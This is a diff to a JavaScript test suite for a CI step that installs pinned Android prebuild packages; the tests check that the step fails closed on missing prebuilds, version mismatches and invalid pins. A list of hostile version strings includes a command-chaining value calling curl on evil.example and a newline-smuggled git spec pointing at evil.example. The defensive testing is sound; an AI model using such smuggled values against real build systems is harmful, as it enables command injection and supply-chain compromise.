@@ -521,11 +521,12 @@ test('provenance mismatch fails instead of testing the wrong binary', () => {
   assert.match(run.output, /but package-version pins/)
 })
 
-// A package with neither layout — no prebuilds/ of its own and no slices to
-// fall through to — is the genuine "nothing to test" case and must still fail
-// closed. The message names the per-platform package that was looked for, so
-// the reader can tell this apart from a split addon whose slice is missing.
-test('a package without prebuilds/ and without slices is rejected', () => {
+// A package with no prebuilds/ and nothing to fall through to must still fail
+// closed. WHICH message it gets matters: a GPR dev build is never sliced, so
+// telling its author to look for a @tetherto/<addon>-mono-android-arm64 package
+// would send them after something that cannot exist, when the real problem is
+// that the on-merge run published the dev build without its prebuild artifacts.
+test('a @tetherto dev build without prebuilds/ is called out as an unsliced publish', () => {
   const run = runStep({
     packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
     force: 'true',
@@ -533,10 +534,33 @@ test('a package without prebuilds/ and without slices is rejected', () => {
   })
 
   assert.notEqual(run.status, 0)
-  assert.match(run.output, /No prebuilds in @tetherto\/llm-llamacpp-mono@0\.47\.0-tmp\.runid-1/)
+  assert.match(run.output, /@tetherto\/llm-llamacpp-mono@0\.47\.0-tmp\.runid-1 ships no prebuilds/)
+  assert.match(run.output, /publishes the UNSLICED tree/)
+  assert.doesNotMatch(
+    run.output,
+    /-mono-android-arm64/,
+    'must not name a GPR slice package, which can never exist',
+  )
+  assert.equal(run.invocations.match(/^spec=/gm).length, 1, 'no second resolve')
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+// The @qvac equivalent: neither layout, so there genuinely is nothing to test.
+// Here naming the platform package IS right — it tells the reader which slice
+// the publish should have produced.
+test('a @qvac package with neither prebuilds/ nor slices is rejected', () => {
+  const run = runStep({
+    addonName: '@qvac/llm-llamacpp',
+    packageVersion: '@qvac/llm-llamacpp@0.47.0',
+    force: 'true',
+    npmEnv: { MOCK_NPM_NO_PREBUILDS: '1', MOCK_NPM_VERSION: '0.47.0' },
+  })
+
+  assert.notEqual(run.status, 0)
+  assert.match(run.output, /No prebuilds in @qvac\/llm-llamacpp@0\.47\.0/)
   assert.match(
     run.output,
-    /no @tetherto\/llm-llamacpp-mono-android-arm64 in its optionalDependencies/,
+    /no @qvac\/llm-llamacpp-android-arm64 in its optionalDependencies/,
     'the failure must name the platform package it looked for',
   )
   assert.equal(run.androidPrebuildInstalled, false)
@@ -613,10 +637,13 @@ test('a split addon with an empty package-version reaches the device', () => {
   )
 })
 
-// The slice version comes from optionalDependencies, which the slicer writes
-// version-locked. Reusing the meta's own version instead would silently resolve
-// the wrong build whenever the two differ.
-test('the slice version is read from optionalDependencies, not the meta version', () => {
+// buildOptionalDependencies() copies metaManifest.version into every entry, so
+// the slice pin and the meta version are equal for anything the slicer produced.
+// A manifest where they differ is wrong or tampered with, and following it would
+// install a build the caller never pinned AFTER the step has already printed
+// "Verified: ... (pinned)" for the meta — the QVAC-21879 shape, where a
+// benchmark baseline measured a binary nobody asked for.
+test('a slice pinned away from the meta version is refused', () => {
   const run = runStep({
     addonName: '@qvac/asr-ggml',
     packageVersion: '@qvac/asr-ggml@0.5.0',
@@ -624,9 +651,14 @@ test('the slice version is read from optionalDependencies, not the meta version'
     npmEnv: { ...SPLIT, MOCK_NPM_SLICE_PIN: '0.4.9' },
   })
 
-  assert.equal(run.status, 0, run.output)
-  assert.match(run.invocations, /spec=@qvac\/asr-ggml-android-arm64@0\.4\.9/)
-  assert.match(run.output, /@qvac\/asr-ggml-android-arm64@0\.4\.9/)
+  assert.notEqual(run.status, 0, 'must not follow a pin away from the meta version')
+  assert.match(run.output, /not at its own version/)
+  assert.doesNotMatch(
+    run.invocations,
+    /-android-arm64@/,
+    'npm must not be invoked for a slice pinned away from the meta version',
+  )
+  assert.equal(run.androidPrebuildInstalled, false)
 })
 
 test('a slice that resolves to a different version fails instead of installing', () => {
@@ -751,10 +783,14 @@ const HOSTILE_SLICE_PINS = [
   'latest',
   '^1.2.0',
   '1.0.0 && curl evil.example',
+  // grep matches per LINE, so a value whose FIRST line is a valid version would
+  // satisfy a line-oriented shape check while smuggling a git spec behind the
+  // newline. The charset gate runs over the whole string and catches it.
+  '0.0.1\ngit+https://evil.example/x.git',
 ]
 
 for (const pin of HOSTILE_SLICE_PINS) {
-  test(`a slice pinned to a non-exact-version spec is refused: ${pin}`, () => {
+  test(`a slice pinned to a non-exact-version spec is refused: ${JSON.stringify(pin)}`, () => {
     const run = runStep({
       addonName: '@qvac/asr-ggml',
       packageVersion: '@qvac/asr-ggml@0.5.0',
@@ -763,7 +799,11 @@ for (const pin of HOSTILE_SLICE_PINS) {
     })
 
     assert.notEqual(run.status, 0, `must fail closed on slice pin ${pin}`)
-    assert.match(run.output, /is not an exact version/)
+    assert.match(
+      run.output,
+      /is not an exact version|cannot appear in a version/,
+      `expected a validation error for ${pin}, got:\n${run.output}`,
+    )
     // The decisive assertion: npm is never handed the hostile spec, so no
     // clone, fetch or prepare script can run.
     assert.doesNotMatch(
@@ -775,14 +815,14 @@ for (const pin of HOSTILE_SLICE_PINS) {
   })
 }
 
-test('a legitimate prerelease slice pin is still accepted', () => {
-  // The guard must not be so tight that it rejects what the slicer can write:
-  // the meta version it copies may carry a prerelease/build suffix.
+test('a legitimate prerelease version is still accepted', () => {
+  // The guards must not be so tight that they reject what the slicer can write:
+  // the meta version it copies into every entry may carry a prerelease suffix.
   const run = runStep({
     addonName: '@qvac/asr-ggml',
-    packageVersion: '@qvac/asr-ggml@0.5.0',
+    packageVersion: '@qvac/asr-ggml@0.5.0-rc.1',
     force: 'true',
-    npmEnv: { ...SPLIT, MOCK_NPM_SLICE_PIN: '0.5.0-rc.1' },
+    npmEnv: { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.5.0-rc.1' },
   })
 
   assert.equal(run.status, 0, run.output)
